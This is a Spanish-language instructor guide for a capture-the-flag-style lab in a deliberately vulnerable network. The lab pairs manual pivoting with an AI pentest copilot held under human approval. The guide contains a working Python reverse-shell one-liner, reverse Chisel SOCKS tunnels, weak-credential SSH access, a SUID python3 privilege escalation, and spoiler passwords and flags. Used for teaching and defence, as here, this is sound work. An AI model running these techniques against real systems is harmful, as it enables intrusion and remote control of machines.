# Clase paso a paso — DVPE × CyberStrikeAI

Esta guía está pensada para el **instructor**. Cada sección incluye objetivos pedagógicos, comandos, pistas, posibles tropiezos y los valores sensibles (flags, contraseñas, rutas) que conviene **no** revelar de antemano al alumnado. La página web del laboratorio (`http://localhost:8088`) replica la misma estructura, con los spoilers ocultos detrás de un botón.

## Mapa de la clase

| Bloque | Módulos | Foco | Tiempo |
|--------|---------|------|--------|
| Preparación | 00 | Infra, modelos, validación | 20 min |
| Red Team — superficie externa | 01, 02 | Reconocimiento y compromiso inicial | 30 min |
| Red Team — pivoting | 03, 04, 05, 06 | Túneles, enumeración interna, escalación | 80 min |
| Purple — IA asistida | 07 | Uso de CyberStrikeAI como copiloto | 25 min |
| Red Team — objetivo final | 08 | Doble pivote, captura de flag final | 30 min |
| Blue Team | 09 | Detección, IOC, mitigación y limpieza | 25 min |

Sugerencia: dividir la clase en dos sesiones de 90 minutos. La primera cubre 00–06; la segunda 07–09 más un cierre con el informe.

---

## Módulo 00 — Preparación del laboratorio

**Objetivos**

1. Garantizar que Docker y Ollama están operativos en el host.
2. Levantar el stack `dvpe-cyberstrikeai-lab` con un único comando.
3. Validar que CyberStrikeAI ya conversa con Ollama.

**Guion para el instructor**

1. Mostrar `docker --version && docker compose version` y `ollama list` (deben existir los modelos descargados).
2. Hacer `git clone` y `make up`. Mientras compila, recordar al alumnado la cláusula ética.
3. Una vez disponible, abrir simultáneamente las cuatro URLs principales (`8088`, `8090`, `6080`, `8081`).

**Errores frecuentes**

- *“Cannot connect to the Docker daemon”*: el alumno está en una distro sin Docker, conviene tener un fallback con Codespaces.
- Ollama corre pero CyberStrikeAI no responde: probar `docker exec -it CyberStrikeAI curl -s http://ollama-proxy:11434/api/tags` para verificar el proxy.

**Spoilers (uso docente)**

- Password root Attacker-PC: `toor`.
- Password root Jerry-PC: `IAmJerry`.

---

## Módulo 01 — Reconocimiento desde el atacante

**Objetivo**: enseñar el reflejo de *primero saber dónde estamos*.

Comandos clave:

```bash
ip -br addr
ip route
nmap -sn 192.168.10.0/24       # ó ping sweep manual
```

El alumno debe descubrir Attacker-PC (10.2), Jerry-PC (10.3), ollama-proxy (10.30), lab-guide (10.20) y CyberStrikeAI (10.10). Aprovecha para discutir la diferencia entre red de operador y red objetivo: en este lab conviven.

---

## Módulo 02 — Compromiso inicial de Jerry-PC

**Objetivo**: explotar credenciales débiles SSH y depositar el toolkit propio.

```bash
ssh root@192.168.10.3                  # password: IAmJerry (spoiler)
scp toolkit.tar.gz root@192.168.10.3:/root/
```

Discutir el coste de mantener un usuario con contraseñas triviales y por qué el SSH público nunca debería aceptar `PermitRootLogin yes`.

---

## Módulo 03 — Pivote SOCKS con Chisel

Levantamos un servidor Chisel reverso en Attacker-PC y un cliente desde Jerry-PC, obteniendo un SOCKS5 en el operador:

```bash
# Attacker-PC
./chisel server -p 8000 --reverse &

# Jerry-PC
./chisel client 192.168.10.2:8000 R:1080:socks &
```

Editar `/etc/proxychains4.conf` y validar:

```bash
proxychains -q nmap --top-ports=20 -sT -Pn --open 192.168.11.3
```

Tip pedagógico: explicar las diferencias entre `-sT` vs `-sS` cuando se enruta vía SOCKS (no se pueden hacer scans crudos sobre SOCKS5).

---

## Módulo 04 — Enumeración web

Dos caminos: `R:5050:192.168.11.3:80` para abrir un *port-forward* directo, o fuzz con ffuf vía SOCKS:

```bash
ffuf -w directory-list-2.3-medium.txt \
     -u http://192.168.11.3/FUZZ/ \
     -x socks5://127.0.0.1:1080 -ic
```

Esperamos hallar `/admin` (`wp2fac`). Es buena oportunidad para hablar de *brute-force* vs *enumeración inteligente* (`-ic`, filtros por status code, exclusión por tamaño).

---

## Módulo 05 — Explotación y reverse shell

Tras encontrar el bypass de OTP en wp2fac, el alumno obtiene RCE. El listener vive en Jerry-PC porque Webserver no es alcanzable desde el host:

```bash
# Jerry-PC
nc -lvnp 4041

# RCE (payload Python)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.11.2",4041));[os.dup2(s.fileno(),f) for f in (0,1,2)];import pty; pty.spawn("/bin/bash")'
```

**Flag esperada en Webserver**: `flag{098f6bcd4621d373cade4e832627b4f6}`.

---

## Módulo 06 — Escalación de privilegios

LinPEAS detecta SUID en `python3`. Cualquier alumno podrá completar la escalada con:

```bash
python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
```

Al ser root, encontrará `/root/id_rsa_home` que más adelante reutilizará en otros hosts (Beth, SpaceBeth, Summer, Server51).

---

## Módulo 07 — Avance lateral con CyberStrikeAI

Aquí cambia el ritmo: el alumno entra a la consola IA (http://localhost:8090, password `lab-cyberstrike`), elige el rol *Pentesting* y pide planificación.

Reglas clave:

- **HITL activo**: el agente sólo lee/lista archivos sin aprobación. Cualquier comando ofensivo requiere que el alumno haga clic en *Aprobar*.
- Modelo por defecto: `llama3.1:8b`. Para razonamientos más profundos se sugiere `deepseek-r1:7b`.
- El agente debe **proponer** comandos para que el alumno los ejecute en el `Attacker-PC` o pivote correspondiente, no automatizar end-to-end.

Prompt sugerido:

> Estás asistiendo un ejercicio autorizado de pivoting interno. Estoy en `Webserver` (192.168.11.3). Tengo SOCKS5 hacia 127.0.0.1:1080. Quiero alcanzar `Summer-PC` (192.168.12.3) sin generar tráfico fuera de las redes 11 y 12. Propón los próximos comandos uno por uno respetando que necesito aprobarlos.

---

## Módulo 08 — Doble pivote y flag final

Encadenamos:

1. SSH a Server51 con la clave reusada (`id_rsa_home`).
2. Nuevo Chisel desde Server51 hacia Jerry-PC para exponer un SOCKS adicional (`:1180`).
3. Reconocimiento sobre `192.168.14.0/24` con `proxychains -q nmap --top-ports=50 -sT -Pn 192.168.14.4`.
4. Salto a Morty-PC y, desde allí, a Rick-PC en `192.168.100.50`.

**Flag final** (Rick-PC): `flag{36d80ec698b0c198a1106f26c9e07a4}`.

---

## Módulo 09 — Visión Blue Team

Cierre obligatorio. Se revisan:

- Logs de Apache en Webserver (`/var/log/apache2/access.log`) buscando los User-Agent de ffuf.
- Conexiones de Chisel reverse en Jerry-PC con `tcpdump`.
- Panel **Maltrail** en `http://localhost:8081` con alertas de tráfico anómalo.

Cada alumno debe entregar:

1. Tres IOCs detectados con timestamps.
2. Tres controles preventivos (rotación de credenciales, segmentación, monitoreo de túneles HTTP reversos).
3. Un breve informe ejecutivo generado por CyberStrikeAI a partir de los logs.

Limpieza al terminar:

```bash
make down       # apaga contenedores
make clean      # borra volúmenes
```

---

## Anexo — Rúbrica sugerida

| Criterio | Excelente | Suficiente | Insuficiente |
|----------|-----------|------------|--------------|
| Reconocimiento metódico | Identifica todos los segmentos sin spoilers | Identifica con pistas | Necesita guía permanente |
| Calidad del pivoting | Túneles encadenados y minimalistas | Túneles funcionales | No alcanza network_e |
| Uso responsable de la IA | Usa HITL, documenta y verifica | Acepta sugerencias sin contrastar | Ejecuta a ciegas |
| Cierre Blue Team | Aporta 3 IOC + 3 controles + informe | 2 IOC | <2 IOC |
